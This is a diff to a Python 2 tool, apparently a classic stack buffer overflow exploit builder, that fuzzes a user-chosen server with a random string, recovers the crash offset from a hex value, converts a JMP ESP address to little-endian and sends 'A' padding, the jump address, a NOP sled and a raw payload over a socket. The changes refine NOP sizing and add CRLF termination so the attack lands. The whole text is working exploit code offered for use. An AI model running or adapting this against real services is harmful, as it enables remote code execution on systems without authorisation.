@@ -24,7 +24,8 @@ class Buffer_Over:
 		 time.sleep(2)
 		 print "\n[+]character length is :",self.length_String
 		 value = string.ascii_letters
-		 self.Random_String = "".join(random.choice(value)for i in range(self.length_String))           
+		 self.Random_String = "".join(random.choice(value)for i in range(self.length_String))
+                 #self.String_reversed = ''.join(reversed( self.Random_String))          
 		 print "\n[+]Generated String is:",self.Random_String 
 		 print '\n[+]The New character length is:',len(self.Random_String )
          except KeyboardInterrupt:
@@ -35,12 +36,13 @@ class Buffer_Over:
           while True:
 	        try:
 	            socket_1= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                    #socket_1 = sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR)
 		    self.server_ip=str(raw_input("\n[+]server ip : "))
 		    time.sleep(2)
 		    self.server_port=int(raw_input("\n[+]server port :"))
 		    socket_1.connect((self.server_ip,self.server_port))
 		    data = socket_1.recv(1023)
-		    socket_1.send(self.Random_String)
+		    socket_1.send( self.Random_String + '\r\n')
 		    time.sleep(2)
 	      	    print "\n[+]data send successful...!!!"
 		    socket_1.close()
@@ -54,8 +56,9 @@ class Buffer_Over:
      def hexadecimal (self):                                                                           
           while True:
                  try: 
-		    self.hexadecimal = str(raw_input("\n[+]Enter your hexadecimal value: "))
-		    self.ASCII = ''.join(chr(int(self.hexadecimal[i:i+2], 16)) for i in range(0, len(self.hexadecimal), 2))
+		    self.hexadecimal = str(raw_input("\n[+]Enter your hexadecimal value: ")).upper()
+                    self.ASCII1 ="".join(reversed([self.hexadecimal[i:i+2] for i in range(0, len(self.hexadecimal), 2)]))                
+		    self.ASCII = ''.join(chr(int(self.ASCII1[i:i+2], 16)) for i in range(0, len(self.ASCII1), 2))
 		    if self.ASCII in  self.Random_String:
 		       print "\n[+]The ASCII Value  is : ",self.ASCII
 		       time.sleep(2)
@@ -129,6 +132,7 @@ class Buffer_Over:
                 self.jump_address="".join(reversed([jump[i:i+2] for i in range(0, len(jump), 2)]))
                 self.jump_address= " ".join("\\x%s"%self.jump_address[i:i+2] for i in range(0, len(self.jump_address), 2))
                 self.jump_address=self.jump_address.replace(" ", "")
+                self.acount = len(self.jump_address) - 12
                 time.sleep(2) 
                 print "\n[+]little endian Value is : ", self.jump_address
              except KeyboardInterrupt:
@@ -141,29 +145,36 @@ class Buffer_Over:
 	       try:
                    socket_2 =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    Start_string = self.location*"A"        
-                   NO_Operation =  len(self.Requst_String) - self.location 
-                   NO_Operation =  NO_Operation*"\\x90"          
+                   NO_Operation = len(self.Requst_String) - self.location - self.acount
+                   NO_Operation =  NO_Operation*"\\x90"       
                    attack = Start_string + self.jump_address + NO_Operation + self.payload_raw
-                   print '\n[+] attack =',len(Start_string),'of "A" + JMP ESP ', self.jump_address ,'+',len(NO_Operation),'of "\\x90" +',self.payload
+                   print attack
+                   print '\n[+] attack =',len(Start_string),'of "A" + JMP ESP ', self.jump_address ,'+',NO_Operation.count("\\x90"),'of "\\x90" +',self.payload
                    time.sleep(2)
                    print "\n[+]conncet server ip is  : ", self.server_ip
                    time.sleep(2)
                    print "\n[+]conncet server port is  : ", self.server_port         
                    socket_2.connect((self.server_ip,self.server_port))
-                   data_recv  = socket_2.recv(1023)
-                   socket_2.send(attack)
+                   data_recv  = socket_2.recv(1024)
+                   socket_2.send( attack + '\r\n')
                    time.sleep(2)
 	           print "\n[+]data send successful...!!!"
                    socket_2.close()
-                   print """              
-                                   %%%%%%%%%%%%%%%%%%%%%%%%(THANK YOU)%%%%%%%%%%%%%%%%%%%%"""                               
+                   print "\n[+]-------------------------{THANK YOU}--------------------------[+]"              
+                                                      
 	           break	
                except Exception:
 		   print "\n[+]something goes wrong try again..!!**!!" 
-                   stop = str(raw_input("Enter any key yo connect :"))
+                   stop = str(raw_input("\n[+]Enter any key to connect ???"))
                except KeyboardInterrupt:
                   print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
                   exit()
+                  
+                  
+                  
+                  
+                  
 if __name__ == '__main__':
     Buffer_Over()
+
 
